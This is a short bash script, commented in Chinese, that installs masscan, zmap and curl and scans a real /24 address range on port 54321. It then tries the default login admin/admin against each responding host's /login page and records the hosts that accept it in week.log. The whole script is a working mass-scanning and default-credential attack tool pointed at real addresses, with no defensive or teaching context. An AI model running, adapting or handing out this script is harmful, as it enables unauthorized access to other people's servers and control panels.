#!/bin/bash

# Install necessary packages
echo "正在开始安装依赖...如未找到软件包,请update"
apt-get install -y masscan curl zmap libpcap-dev
echo "已安装所有依赖 & 开始扫描"

cd masscan

# Run masscan
masscan 93.179.124.0/24 -p54321 --banners --exclude 255.255.255.255 -oJ scan.json --rate 100000

# Press Ctrl+C to stop scanning and start blasting

# Process scan results
for ip_ad in $(sed -nE  's/.*"ip": "([^"]+)".*/\1/p' scan.json); do
        if curl --max-time 1 http://$ip_ad:54321; then
                res=$(curl "http://${ip_ad}:54321/login"  --data-raw 'username=admin&password=admin' --compressed  --insecure)
                if [[ "$res" =~ .*true.* ]]; then
                        echo $ip_ad | tee >> week.log
                fi
                echo $ip_ad | tee >> all.log
        fi
done;

# Script execution completed
echo "运行完成，请查看 week.log 和 all.log 以获取结果"